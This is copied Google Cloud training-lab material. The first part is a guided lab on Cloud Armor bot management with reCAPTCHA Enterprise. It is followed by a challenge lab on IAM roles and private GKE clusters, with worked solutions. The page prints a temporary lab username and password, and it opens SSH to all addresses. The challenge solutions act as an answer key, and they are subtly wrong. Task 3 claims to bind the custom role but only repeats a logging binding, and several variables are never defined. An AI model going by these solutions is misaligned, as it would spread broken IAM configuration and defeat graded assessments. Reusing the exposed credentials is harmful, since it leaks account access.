Google Cloud HTTP(S) load balancing is deployed at the edge of Google's network in Google points of presence (POP) around the world. User traffic directed to an HTTP(S) load balancer enters the POP closest to the user and is then load balanced over Google's global network to the closest backend that has sufficient capacity available.

Cloud Armor is Google's distributed denial of service and web application firewall (WAF) detection system. Cloud Armor is tightly coupled with the Google Cloud HTTP Load Balancer and safeguards applications of Google Cloud customers from attacks from the internet.

[reCAPTCHA Enterprise](https://cloud.google.com/recaptcha-enterprise/docs) is a service that builds on the reCAPTCHA API and protects your site from spam and abuse using advanced risk analysis techniques to tell humans and bots apart. Cloud Armor Bot Management provides an end-to-end solution integrating reCAPTCHA Enterprise bot detection and scoring with enforcement by Cloud Armor at the edge of the network to protect downstream applications.

In this lab, you configure an HTTP Load Balancer with a backend, as shown in the diagram below. You set up a reCAPTCHA session token site key and embed it in your website. You also set up redirection to reCAPTCHA Enterprise manual challenge. You then configure a Cloud Armor bot management policy to see how bot detection protects your application from malicious bot traffic.

![HTTP Load Balancer configuration diagram](images/2kXQgNWkDCt0e9E84gvWp1ZIZrQg5kdhgkF2uWghtlI%3D.png)

### What you'll learn

In this lab, you learn how to:

- Set up a HTTP Load Balancer with appropriate health checks
- Create a reCAPTCHA WAF challenge-page site key and associated it with Cloud Armor security policy
- Create a reCAPTCHA session token site key and install it on your web pages
- Create a Cloud Armor bot management policy
- Validate that the bot management policy is handling traffic based on the rules configured

### Setup and requirements

### Before you click the Start Lab button

Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click **Start Lab**, shows how long Google Cloud resources are made available to you.

This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.

To complete this lab, you need:

- Access to a standard internet browser (Chrome browser recommended).

**Note:** Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.

- Time to complete the lab—remember, once you start, you cannot pause a lab.

**Note:** Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.

### How to start your lab and sign in to the Google Cloud console

1. Click the **Start Lab** button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:

   - The Open Google Cloud console button
   - Time remaining
   - The temporary credentials that you must use for this lab
   - Other information, if needed, to step through this lab

2. Click **Open Google Cloud console** (or right-click and select **Open Link in Incognito Window** if you are running the Chrome browser).

   The lab spins up resources, and then opens another tab that shows the Sign in page.

   ***Tip:\*** Arrange the tabs in separate windows, side-by-side.

   **Note:** If you see the **Choose an account** dialog, click **Use Another Account**.

3. If necessary, copy the **Username** below and paste it into the **Sign in** dialog.

   ```
   student-02-21eef573fe2f@qwiklabs.net
   ```

   Copied!

   You can also find the Username in the Lab Details pane.

4. Click **Next**.

5. Copy the **Password** below and paste it into the **Welcome** dialog.

   ```
   FIduoI7qcGGe
   ```

   Copied!

   You can also find the Password in the Lab Details pane.

6. Click **Next**.

   **Important:** You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.

   **Note:** Using your own Google Cloud account for this lab may incur extra charges.

7. Click through the subsequent pages:

   - Accept the terms and conditions.
   - Do not add recovery options or two-factor authentication (because this is a temporary account).
   - Do not sign up for free trials.

After a few moments, the Google Cloud console opens in this tab.

**Note:** To access Google Cloud products and services, click the **Navigation menu** or type the service or product name in the **Search** field. ![Navigation menu icon and Search field](images/9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D.png)

### Before you begin

- In Cloud Shell, set up your project ID:

```
export PROJECT_ID=$(gcloud config get-value project)
echo $PROJECT_ID
gcloud config set project $PROJECT_ID
```

Copied!

### Enable APIs

- Enable all necessary services:

```
gcloud services enable compute.googleapis.com
gcloud services enable logging.googleapis.com
gcloud services enable monitoring.googleapis.com
gcloud services enable recaptchaenterprise.googleapis.com
```

Copied!

You're now set up to begin the first task.

### Task 1. Configure firewall rules to allow HTTP and SSH traffic to backends

For this lab, you use the ***default\*** VPC network created in your project when the lab spun up.

In this section, you configure firewall rules to allow HTTP traffic to the backends from the Google Cloud health checks and the Load Balancer. You then configure a firewall rule to allow SSH into the instances.

##### Create a firewall rule to allow HTTP traffic to the backends.

Health checks determine which instances of a load balancer can receive new connections. For HTTP load balancing, the health check probes to your load balanced instances come from addresses in the ranges **130.211.0.0/22 and 35.191.0.0/16**. Your VPC firewall rules must allow these connections. Also, the load balancers talk to the backend on the same IP range.

To create a firewall rule to allow HTTP traffic to the backends:

1. In the console, navigate to **Navigation menu (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)) > VPC network > Firewall**.
2. Notice the existing **ICMP**, **internal**, **RDP**, and **SSH** firewall rules. Each Google Cloud project starts with the default network and these firewall rules.
3. Click **Create Firewall Rule**.
4. Set the following values, leave all other values at their defaults:

| Property                | Value (type value or select option as specified)             |
| :---------------------- | :----------------------------------------------------------- |
| **Name**                | default-allow-health-check                                   |
| **Network**             | default                                                      |
| **Targets**             | Specified target tags                                        |
| **Target tags**         | allow-health-check                                           |
| **Source filter**       | IPv4 Ranges                                                  |
| **Source IPv4 ranges**  | 130.211.0.0/22, 35.191.0.0/16                                |
| **Protocols and ports** | Specified protocols and ports, and then check `tcp`. Type `80` for the port number |

**Note:** Be sure to enter the two **Source IPv4 ranges** one-by-one and press SPACE in between them.

1. Click **Create**.

Alternatively, in the gCloud command line, use the following command:

```
gcloud compute firewall-rules create default-allow-health-check --direction=INGRESS --priority=1000 --network=default --action=ALLOW --rules=tcp:80 --source-ranges=130.211.0.0/22,35.191.0.0/16 --target-tags=allow-health-check
```

Copied!

1. Similarly, create a firewall rule to allow SSH-ing into the instances:

```
gcloud compute firewall-rules create allow-ssh --direction=INGRESS --priority=1000 --network=default --action=ALLOW --rules=tcp:22 --source-ranges=0.0.0.0/0 --target-tags=allow-health-check
```

Copied!

Click **Check my progress** to verify the objective.

Configure firewall rules to allow HTTP and SSH traffic to backends



Check my progress



### Task 2. Configure instance templates and create managed instance groups

A managed instance group uses an instance template to create a group of identical instances. Use these to create the backend of the HTTP Load Balancer.

#### Configure the instance templates

An instance template is a resource that you use to create VM instances and managed instance groups. Instance templates define the machine type, boot disk image, subnet, labels, and other instance properties.

To create an instance template:

1. In the console, navigate to **Navigation menu (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)) > Compute Engine > Instance templates**, and then click **Create instance template**.
2. For **Name**, type **lb-backend-template**.
3. For **Location**, Select **Global**.
4. For Series, select **N1**.
5. Click **Networking, Disks, Security, Management, Sole-Tenancy** under **Advanced options**.
6. Go to the **Management** section and insert the following script into the **Startup script** field:

```
#! /bin/bash
sudo apt-get update
sudo apt-get install apache2 -y
sudo a2ensite default-ssl
sudo a2enmod ssl
sudo su
vm_hostname="$(curl -H "Metadata-Flavor:Google" \
http://metadata.google.internal/computeMetadata/v1/instance/name)"
echo "Page served from: $vm_hostname" | \
tee /var/www/html/index.html
```

Copied!

1. Click on the **Networking** tab and add the network tag: **allow-health-check**
2. Set the following values and leave all other values at their defaults:

| Property                                  | Value (type value or select option as specified) |
| :---------------------------------------- | :----------------------------------------------- |
| **Network (Under Network Interfaces)**    | default                                          |
| **Subnetwork (Under Network Interfaces)** | default (`us-central1`)                          |
| **Network tags**                          | allow-health-check                               |

**Note:** The network tag **allow-health-check** ensures that the HTTP Health Check and SSH firewall rules apply to these instances.

1. Click **Create**.

Wait for the instance template to be created.

#### Create the managed instance group

To Create the managed instance group:

1. Still in **Compute Engine** page, click **Instance groups** in the left pane.
2. Click **Create instance group**.
3. Select **New managed instance group (stateless)**.
4. Set the following values, leave all other values at their defaults:

| Property                       | Value (type value or select option as specified)      |
| :----------------------------- | :---------------------------------------------------- |
| **Name**                       | lb-backend-example                                    |
| **Location**                   | Single zone                                           |
| **Region**                     | `us-central1`                                         |
| **Zone**                       | `us-central1-c`                                       |
| **Instance template**          | lb-backend-template                                   |
| **Autoscaling**                | Set **Autoscaling mode** to **Off: do not autoscale** |
| **Minimum number of instance** | 1                                                     |

1. Click **Create**.

#### Add a named port to the instance group

- For your instance group, in Cloud Shell, define an HTTP service and map a port name to the relevant port:

```
gcloud compute instance-groups set-named-ports lb-backend-example \
--named-ports http:80 \
--zone <var>us-central1-c</var>
```

Copied!

The load balancing service forwards traffic to the named port.

Click **Check my progress** to verify the objective.

Configure instance templates and create managed instance groups



Check my progress



### Task 3. Configure the HTTP Load Balancer

In this section, you configure the HTTP Load Balancer to send traffic to your backend **lb-backend-example**.

#### Start the configuration

1. In the console, click **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)) > click **Network Services** > **Load balancing**, and then click **Create load balancer**.
2. Select **Application Load Balancer (HTTP/HTTPS)** and **Next**.
3. Select **Public facing (external)** and **Next**.
4. Select **Best for global workloads** and **Next**.
5. Select **Global external Application Load Balancer** and **Next**.
6. Select **Configure**.
7. Set the **Name** to `http-lb`.

#### Configure the frontend

1. Click **Frontend configuration**.
2. Specify the following, leaving all other values at their defaults:

| Property       | Value (type value or select option as specified) |
| :------------- | :----------------------------------------------- |
| **Protocol**   | HTTP                                             |
| **IP version** | IPv4                                             |
| **IP address** | Ephemeral                                        |
| **Port**       | 80                                               |

1. Click **Done**.

#### Configure the backend

Backend services direct incoming traffic to one or more attached backends. Each backend is composed of an instance group and additional serving capacity metadata.

1. Click on **Backend configuration**.
2. For **Backend services & backend buckets**, click **Create a backend service**.
3. Set the following values, leave all other values at their defaults:

| Property           | Value (select option as specified) |
| :----------------- | :--------------------------------- |
| **Name**           | http-backend                       |
| **Protocol**       | HTTP                               |
| **Named Port**     | http                               |
| **Instance group** | lb-backend-example                 |
| **Port numbers**   | 80                                 |

1. Click **Done**.
2. For **Cloud CDN**, set the **Cache mode** to **Use origin settings based on Cache-Control headers**.
3. For **Health Check**, select **Create a health check**.

![Create a health check button](images/v4LmFGAsRY27SSVBpF1v9LLdLhQ%2Bx5Nt%2BQpczoRw%2Fxw%3D.png)

1. Set the following values, leave all other values at their defaults:

| Property     | Value (select option as specified) |
| :----------- | :--------------------------------- |
| **Name**     | http-health-check                  |
| **Protocol** | TCP                                |
| **Port**     | 80                                 |

**Note:** Health checks determine which instances receive new connections.



This HTTP health check polls instances every 5 seconds, waits up to 5 seconds for a response and treats 2 successful or 2 failed attempts as healthy or unhealthy, respectively.

1. Click **Save**.
2. Check the **Enable Logging box**.
3. Set the **Sample rate** to `1`.
4. Click **Create** to create the backend service and click **ok**.

#### Review and create the HTTP Load Balancer

Host and path rules determine how your traffic is directed. For example, you could direct video traffic to one backend and static traffic to another backend. However, you are not configuring the Host and path rules in this lab.

1. Click on **Review and finalize**.

![Load Balancer review and finalize page, which includes information in several categories, such as host and path rules, and backend services](images/RIqOpdDekxI950rGFYHSrRKhl%2BIDRxI%2FsJawQuvSLU8%3D.png)

1. Review the **Backend services** and **Frontend**.
2. Click on **Create**.

Wait for the load balancer to be created.

1. Click on the name of the load balancer (**http-lb**).
2. Note the IPv4 address of the load balancer for the next task. In this lab, refer to it as `[LB_IP_v4]`.

Click **Check my progress** to verify the objective.

Configure the HTTP Load Balancer



Check my progress



#### Test the HTTP Load Balancer

Now that you created the HTTP Load Balancer for your backends, verify that traffic is forwarded to the backend service.

- To test IPv4 access to the HTTP Load Balancer, open a new tab in your browser and navigate to **http://[LB_IP_v4]**. Be sure to replace `[LB_IP_v4]` with the IPv4 address of the load balancer.

**Note:** It might take up to 5 minutes to access the HTTP Load Balancer. In the meantime, you might get a 404 or 502 error. Keep trying until you see the page load.

### Task 4. Create and deploy reCAPTCHA session token and challenge-page site key

reCAPTCHA Enterprise for WAF and Google Cloud Armor integration offers the following features: [reCAPTCHA challenge page](https://cloud.google.com/recaptcha-enterprise/docs/usecase#redirect), [reCAPTCHA action-tokens](https://cloud.google.com/recaptcha-enterprise/docs/usecase#action-token), and [reCAPTCHA session-tokens](https://cloud.google.com/recaptcha-enterprise/docs/usecase#session-token). In this task, you implement the reCATCHA session token site key and reCAPTCHA WAF challenge-page site.

#### Create reCAPTCHA session token and WAF challenge-page site key

Before you create the session token site key and challenge page site key, double-check that you've enabled the reCAPTCHA Enterprise API as indicated in the previous *Enable API* section.

The reCAPTCHA JavaScript sets a reCAPTCHA session-token as a cookie on the end-user's browser after the assessment. The end-user's browser attaches the cookie and refreshes the cookie as long as the reCAPTCHA JavaScript remains active.

1. Create the reCAPTCHA session token site key and enable the WAF feature for the key:

```
gcloud recaptcha keys create --display-name=test-key-name \
  --web --allow-all-domains --integration-type=score --testing-score=0.5 \
  --waf-feature=session-token --waf-service=ca
```

Copied!

The output of the above command gives you the session token site key you created. Record it to use later in this task.

You also set the WAF service to Cloud Armor to enable the Cloud Armor integration.

**Note:** You are using the integration type **score** which is leveraged in the Cloud Armor policy. You can alternatively use **checkbox** and **invisible**.



You also set a **testing score** when you create the key to validate that the bot management policies created with Cloud Armor are working as intended. Replicating bot traffic is not easy, so this is a good way to test the feature.

1. Create the reCAPTCHA WAF challenge-page site key and enable the WAF feature for the key. You can use the reCAPTCHA challenge page feature to redirect incoming requests to reCAPTCHA Enterprise to determine whether each request is potentially fraudulent or legitimate. Later, you associate this key with the Cloud Armor security policy to enable the manual challenge. This lab refers to this key as `CHALLENGE-PAGE-KEY` in the later steps.

```
gcloud recaptcha keys create --display-name=challenge-page-key \
--web --allow-all-domains --integration-type=INVISIBLE \
--waf-feature=challenge-page --waf-service=ca
```

Copied!

1. Navigate to **Navigation menu (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)) > Security > reCAPTCHA Enterprise**. You should see the keys you created in the **Enterprise Keys** list:

#### Implement reCAPTCHA session token site key

1. Navigate to **Navigation menu (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)) > Compute Engine > VM Instances**. Locate the VM in your instance group and SSH to it.

![The highlighted SSH within the Connect column](images/AQj28q12uBrWsd0n8zV4%2Bo%2F8piYYiQVwiSotUEYiNGE%3D.png)

1. Go to the webserver root directory and change user to root:

```
cd /var/www/html/
sudo su
```

Copied!

1. Update the landing `index.html` page and embed the reCAPTCHA session token site key. The session token site key (that you recorded earlier) is set in the head section of your landing page as below:

```
src="https://www.google.com/recaptcha/enterprise.js?render=<SESSION_TOKEN_SITE_KEY>&waf=session" async defer>
```

Remember to replace `<SESSION_TOKEN_SITE_KEY>` with the site token before you run the following command:

```
echo '<!doctype html><html><head><title>ReCAPTCHA Session Token</title><script src="https://www.google.com/recaptcha/enterprise.js?render=<SESSION_TOKEN_SITE_KEY>&waf=session" async defer></script></head><body><h1>Main Page</h1><p><a href="/good-score.html">Visit allowed link</a></p><p><a href="/bad-score.html">Visit blocked link</a></p><p><a href="/median-score.html">Visit redirect link</a></p></body></html>' > index.html
```

Copied!

1. Create three other sample pages to test out the bot management policies:

- **good-score.html**

```
echo '<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"></head><body><h1>Congrats! You have a good score!!</h1></body></html>' > good-score.html
```

Copied!

- **bad-score.html**

```
echo '<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"></head><body><h1>Sorry, You have a bad score!</h1></body></html>' > bad-score.html
```

Copied!

- **median-score.html**

```
echo '<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"></head><body><h1>You have a median score that we need a second verification.</h1></body></html>' > median-score.html
```

Copied!

Validate that you are able to access all the webpages by opening them in your browser. Be sure to replace `[LB_IP_v4]` with the IPv4 address of the load balancer:

1. Open `http://[LB_IP_v4]/index.html`. You verify that the reCAPTCHA implementation is working when you see "protected by reCAPTCHA" at the bottom right corner of the page:

![Reptcha logo](images/hijCD02uC9m6FzFygoYmmJeU8b06l3oLtlfyUDXmnF4%3D.png)

1. Click into each of the links.

![The Main Page within the browser, which includes three links](images/d%2B8kqWJEyfY1srSw17QjZmrvHufNUR%2FLFyigfgO6afQ%3D.png)

1. Validate you are able to access all the pages.

![The message: Congrats! You have a good score!](images/riGt21Sk4umYJFO84160eIeMSblu5VKRYsto%2FA06nsc%3D.png)

Click **Check my progress** to verify the objective.

Deploy reCAPTCHA session token and challenge-page site key



Check my progress



### Task 5. Create Cloud Armor security policy rules for Bot Management

In this section, you use Cloud Armor bot management rules to allow, deny and redirect requests based on the reCAPTCHA score.

1. In Cloud Shell, create security policy via gcloud:

```
gcloud compute security-policies create recaptcha-policy \
    --description "policy for bot management"
```

Copied!

1. To use reCAPTCHA Enterprise manual challenge to distinguish between human and automated clients, associate the reCAPTCHA WAF challenge site key (CHALLENGE-PAGE-KEY) you previously created for a manual challenge with the security policy. In the following script, remember to replace "CHALLENGE-PAGE-KEY" with the key you previously created:

```
gcloud compute security-policies update recaptcha-policy \
  --recaptcha-redirect-site-key "CHALLENGE-PAGE-KEY"
```

Copied!

1. Add a bot management rule to allow traffic if the url path matches good-score.html and has a score greater than 0.4:

```
gcloud compute security-policies rules create 2000 \
    --security-policy recaptcha-policy\
    --expression "request.path.matches('good-score.html') &&    token.recaptcha_session.score > 0.4"\
    --action allow
```

Copied!

1. Add a bot management rule to deny traffic if the url path matches bad-score.html and has a score less than 0.6:

```
gcloud compute security-policies rules create 3000 \
    --security-policy recaptcha-policy\
    --expression "request.path.matches('bad-score.html') && token.recaptcha_session.score < 0.6"\
    --action "deny-403"
```

Copied!

1. Add a bot management rule to redirect traffic to Google reCAPTCHA if the url path matches median-score.html and has a score equal to 0.5:

```
gcloud compute security-policies rules create 1000 \
    --security-policy recaptcha-policy\
    --expression "request.path.matches('median-score.html') && token.recaptcha_session.score == 0.5"\
    --action redirect \
    --redirect-type google-recaptcha
```

Copied!

1. Attach the security policy to the backend service `http-backend`:

```
gcloud compute backend-services update http-backend \
    --security-policy recaptcha-policy --global
```

Copied!

1. In the console, navigate to **Navigation menu > Network Security > Cloud Armor policies**.
2. Click `recaptcha-policy`.

Your policy should resemble the following:

![Rules tabbed page, which lists several actions and their priority](https://cdn.qwiklabs.com/MUo8wSm0AeKcnKWcTUGeKggj%2BMTo7zMfpjCvk4qh52c%3D)

Click **Check my progress** to verify the objective.

Create Cloud Armor security policy rules for Bot Management



Check my progress



### Task 6. Validate Bot Management with Cloud Armor

1. Open up a browser and enter the url `http://[LB_IP_v4]/index.html`. Navigate to **"Visit allowed link"**.

![The good-score web page, which displays the text 'Congrats! You have a good score!'](images/P1Pds%2BhAsOsycMJebzf42l9VHjvuaPQfP83bHWDGzTQ%3D.png)

1. Open a new window in Incognito mode to ensure you have a new session.
2. Enter the url `http://[LB_IP_v4]/index.html` and navigate to **"Visit blocked link"**. You should receive a **HTTP 403** error:

![The error message '403 Forbidden'](images/9i7F%2FqK%2BZGRx7uygrWvBfAASRtqCrheiudDynmPZNas%3D.png)

1. Open a new window in Incognito mode to ensure you have a new session.
2. Enter the url `http://[LB_IP_v4]/index.html` and navigate to **"Visit redirect link"**. You should see the redirection to Google reCAPTCHA and the manual challenge page as below:

![Google reCAPTCHA dialog](images/yAOj0fZVtc1LUyQgrla3AJj1ukhDVXERnQ%2FPwAULteA%3D.png)

**Note:** If the user interaction passes the assessment, reCAPTCHA Enterprise issues an exemption cookie. The browser attaches this exemption cookie to the user's subsequent requests to the same site until the cookie expires. By default, the exemption cookie expires after three hours.

**Note:** To prevent automated software from participating in abusive actions on your site, reCAPTCHA uses an advanced risk analysis engine and adaptive CAPTCHAs. It accomplishes this while allowing your valid users to pass through with ease. If the algorithm believes you are a human, it will validate the reCaptcha without additional action from you. If not, it will display a variety of images that you must categorize before proceeding. Only the most suspect traffic will be requested to solve a captcha by default. If you are not served with a challenge to solve, you can still check the policy logs and verify that you were exempted from solving a challenge.

#### Verify Cloud Armor logs

Explore the security policy logs to validate bot management worked as expected.

1. In the console, navigate to **Navigation menu > Network Security > Cloud Armor**.
2. Click **recaptcha-policy**.
3. Click **Logs**.
4. Click **View policy logs**.
5. Below is the MQL(monitoring query language) query, copy and paste into the query editor:

```
resource.type:(http_load_balancer) AND jsonPayload.enforcedSecurityPolicy.name:(recaptcha-policy)
```

Copied!

1. Now click **Run Query**.
2. Look for a log entry in Query results where the request is for `http://[LB_IP_v4]/good-score.html`. Expand jsonPayload.Expand enforcedSecurityPolicy.

![The expanded jsonPayload.Expand enforcedSecurityPolicy and highlighted html](images/%2B%2F23uHRDBxuG1FsCvn4FnsgdACURikUnexbEqfyzk%2FM%3D.png)

**Note:** If you are not seeing log entries, wait a couple of minutes for the policy to propagate, refresh the URLs you used earlier, then check the logs again.

1. Repeat the same for `http://[LB_IP_v4]/bad-score.html` and `http://[LB_IP_v4]/median-score.html`.

![The expanded security policy and request data for the bad-score link](images/hUuMWSm6%2Fzp5JgNQCjayWprE6pnDkmz4Zj5%2B99lUSGs%3D.png)

![The expanded security policy and request data for the median-score link](images/652z3yZfcsUfKGsUkhtTPEtD3AVDVpcxNWYlgbHhDWE%3D.png)

Notice that the `configuredAction` is set to **ALLOW, DENY or GOOGLE_RECAPTCHA** with the name **recaptcha-policy**.

**Note:** Cloud Armor security policies create logs that can be explored to determine when traffic is denied and when it is allowed, along with the source of the traffic.

Click **Check my progress** to verify the objective.

Validate bot management with Cloud Armor



Check my progress



### Congratulations!

You successfully implemented bot management with Cloud Armor. You configured an HTTP Load Balancer. Then, you created and implemented reCAPTCHA session token site key on a webpage. You also created a challenge-page site key. You set up Cloud Armor Bot management policy and validated how they handle requests based on the rules. You explored the security policy logs to identify why the traffic was allowed, blocked or redirected.







# Implement Cloud Security Fundamentals on Google Cloud



## Implement Cloud Security Fundamentals on Google Cloud: Challenge Lab

### Overview

In a challenge lab you’re given a scenario and a set of tasks. Instead of following step-by-step instructions, you will use the skills learned from the labs in the course to figure out how to complete the tasks on your own! An automated scoring system (shown on this page) will provide feedback on whether you have completed your tasks correctly.

When you take a challenge lab, you will not be taught new Google Cloud concepts. You are expected to extend your learned skills, like changing default values and reading and researching error messages to fix your own mistakes.

To score 100% you must successfully complete all tasks within the time period!

This lab is recommended for students who have enrolled in the [Implement Cloud Security Fundamentals on Google Cloud](https://www.cloudskillsboost.google/course_templates/645) skill badge. Are you ready for the challenge?

#### Topics tested

- Create a custom security role.
- Create a service account.
- Bind IAM security roles to a service account.
- Create a private Kubernetes Engine cluster in a custom subnet.
- Deploy an application to a private Kubernetes Engine cluster

### Setup and requirements

#### Before you click the Start Lab button

Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click **Start Lab**, shows how long Google Cloud resources are made available to you.

This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.

To complete this lab, you need:

- Access to a standard internet browser (Chrome browser recommended).

**Note:** Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.

- Time to complete the lab—remember, once you start, you cannot pause a lab.

**Note:** Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.

### Challenge scenario

You have started a new role as a junior member of the security team for the Orca team in Jooli Inc. Your team is responsible for ensuring the security of the Cloud infrastructure and services that the company's applications depend on.

You are expected to have the skills and knowledge for these tasks, so don't expect step-by-step guides to be provided.

#### Your challenge

You have been asked to deploy, configure, and test a new Kubernetes Engine cluster that will be used for application development and pipeline testing by the Orca development team.

As per the organization's security standards you must ensure that the new Kubernetes Engine cluster is built according to the organization's most recent security standards and thereby must comply with the following:

- The cluster must be deployed using a dedicated service account configured with the least privileges required.
- The cluster must be deployed as a Kubernetes Engine private cluster, with the public endpoint disabled, and the master authorized network set to include only the ip-address of the Orca group's management jumphost.
- The Kubernetes Engine private cluster must be deployed to the `orca-build-subnet` in the Orca Build VPC.

From a previous project you know that the minimum permissions required by the service account that is specified for a Kubernetes Engine cluster is covered by these three built in roles:

- `roles/monitoring.viewer`
- `roles/monitoring.metricWriter`
- `roles/logging.logWriter`

These roles are specified in the Google Kubernetes Engine (GKE)'s Harden your cluster's security guide in the [Use least privilege Google service accounts](https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#use_least_privilege_sa) section.

You must bind the above roles to the service account used by the cluster as well as a custom role that you must create in order to provide access to any other services specified by the development team. Initially you have been told that the development team requires that the service account used by the cluster should have the permissions necessary to add and update objects in Google Cloud Storage buckets. To do this you will have to create a new custom IAM role that will provide the following permissions:

- `storage.buckets.get`
- `storage.objects.get`
- `storage.objects.list`
- `storage.objects.update`
- `storage.objects.create`

Once you have created the new private cluster you must test that it is correctly configured by connecting to it from the jumphost, `orca-jumphost`, in the management subnet `orca-mgmt-subnet`. As this compute instance is not in the same subnet as the private cluster you must make sure that the master authorized networks for the cluster includes the internal ip-address for the instance, and you must specify the `--internal-ip` flag when retrieving cluster credentials using the `gcloud container clusters get-credentials` command.

All new cloud objects and services that you create should include the "orca-" prefix.

Your final task is to validate that the cluster is working correctly by deploying a simple application to the cluster to test that management access to the cluster using the `kubectl` tool is working from the `orca-jumphost` compute instance.

For all tasks in this lab, use the `europe-west4` region and the `europe-west4-b` zone.

### Task 1. Create a custom security role

Your first task is to create a new custom IAM security role called `orca_storage_editor_401` that will provide the Google Cloud storage bucket and object permissions required to be able to create and update storage objects.

#### Solution

**Create a Role Definition File**:

```
cat > role-definition.yaml <<EOF_END
title: "$CUSTOM_SECURIY_ROLE"
description: "Permissions"
stage: "ALPHA"
includedPermissions:
- storage.buckets.get
- storage.objects.get
- storage.objects.list
- storage.objects.update
- storage.objects.create
EOF_END
```

Here, we create a YAML file that defines the custom IAM role. This file specifies the title, description, stage, and included permissions for the role.

**Create the Custom Security Role**:

```
gcloud iam roles create $CUSTOM_SECURIY_ROLE --project $DEVSHELL_PROJECT_ID --file role-definition.yaml
```

Assessment Completed!

Check that a Custom security role has been created.



Check my progress

*Assessment Completed!*





### Task 2. Create a service account

Your second task is to create the dedicated service account that will be used as the service account for your new private cluster. You must name this account `orca-private-cluster-523-sa`.

#### Solution

```
gcloud iam service-accounts create orca-private-cluster-523-sa --display-name "Orca Private Cluster Service Account"
```

Check that a new service account has been created.



Check my progress



### Task 3. Bind a custom security role to a service account

You must now bind the Cloud Operations logging and monitoring roles that are required for Kubernetes Engine Cluster service accounts as well as the custom IAM role you created for storage permissions to the Service Account you created earlier.

#### Solution 

**Bind IAM Policy Roles:**

```
gcloud projects add-iam-policy-binding qwiklabs-gcp-02-7589d0814713 --member serviceAccount:orca-private-cluster-523-sa@qwiklabs-gcp-02-7589d0814713.iam.gserviceaccount.com --role roles/monitoring.viewer

gcloud projects add-iam-policy-binding qwiklabs-gcp-02-7589d0814713 --member serviceAccount:orca-private-cluster-523-sa@qwiklabs-gcp-02-7589d0814713.iam.gserviceaccount.com --role roles/monitoring.metricWriter

gcloud projects add-iam-policy-binding qwiklabs-gcp-02-7589d0814713 --member serviceAccount:orca-private-cluster-523-sa@qwiklabs-gcp-02-7589d0814713.iam.gserviceaccount.com --role roles/logging.logWriter

gcloud projects add-iam-policy-binding qwiklabs-gcp-02-7589d0814713 --member serviceAccount:orca-private-cluster-523-sa@qwiklabs-gcp-02-7589d0814713.iam.gserviceaccount.com --role roles/logging.logWriter
```

These commands bind various IAM roles to the service account. The roles `monitoring.viewer`, `monitoring.metricWriter`, and `logging.logWriter` provide monitoring and logging capabilities. The custom role created in Task 1 is also bound to the service account.

Check that a the correct built in and custom security roles have been bound to the new service account.



Check my progress



### Task 4. Create and configure a new Kubernetes Engine private cluster

You must now use the service account you have configured when creating a new Kubernetes Engine private cluster. The new cluster configuration must include the following:

- The cluster must be called `orca-cluster-455`
- The cluster must be deployed to the subnet `orca-build-subnet`
- The cluster must be configured to use the `orca-private-cluster-523-sa` service account.
- The private cluster options `enable-master-authorized-networks`, `enable-ip-alias`, `enable-private-nodes`, and `enable-private-endpoint` must be enabled.

Once the cluster is configured you must add the internal ip-address of the `orca-jumphost` compute instance to the master authorized network list.

**Create the GKE Cluster**:

```
gcloud container clusters create $CLUSTER_NAME --num-nodes 1 --master-ipv4-cidr=172.16.0.64/28 --network orca-build-vpc --subnetwork orca-build-subnet --enable-master-authorized-networks --master-authorized-networks 192.168.10.2/32 --enable-ip-alias --enable-private-nodes --enable-private-endpoint --service-account $SERVICE_ACCOUNT@$DEVSHELL_PROJECT_ID.iam.gserviceaccount.com --zone $ZONE
```

This command creates a private Google Kubernetes Engine (GKE) cluster. Key configurations include enabling private nodes and endpoints, setting master authorized networks, and specifying the service account for the cluster.

Confirm that a Kubernetes Engine private cluster has been deployed correctly.



Check my progress



### Task 5. Deploy an application to a private Kubernetes Engine cluster

You have a simple test application that can be deployed to any cluster to quickly test that basic container deployment functionality is working and that basic services can be created and accessed. You must configure the environment so that you can deploy this simple demo to the new cluster using the jumphost `orca-jumphost`.

**Note:** Make sure to properly install the `gke-gcloud-auth-plugin` before running any `kubectl` commands. This is detailed below in **Tip 1**.

```
kubectl create deployment hello-server --image=gcr.io/google-samples/hello-app:1.0
```



This deploys an application that listens on port 8080 that can be exposed using a basic load balancer service for testing.

#### Solution

**Connect to the orca-jumphost VM**

```
gcloud compute ssh --zone "$ZONE" "orca-jumphost" --project qwiklabs-gcp-02-7589d0814713 
```

**Run this command to orca-jumphost VM**

```
gcloud config set compute/zone europe-west4-b 

gcloud container clusters get-credentials orca-cluster-455 --project qwiklabs-gcp-02-7589d0814713 --internal-ip --location europe-west4

